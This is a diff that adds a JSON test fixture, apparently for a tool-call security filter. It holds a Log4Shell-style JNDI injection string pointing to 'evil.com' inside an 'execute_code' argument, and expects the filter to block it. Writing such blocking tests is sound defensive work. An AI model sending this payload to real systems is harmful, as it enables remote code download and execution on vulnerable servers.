@@ -1,0 +1,10 @@
+{
+  "toolName": "execute_code",
+  "arguments": {
+    "code": "${jndi:ldap://evil.com/a}",
+    "language": "java"
+  },
+  "expected": "block",
+  "category": "deserialization",
+  "ruleHint": "jndi-injection"
+}
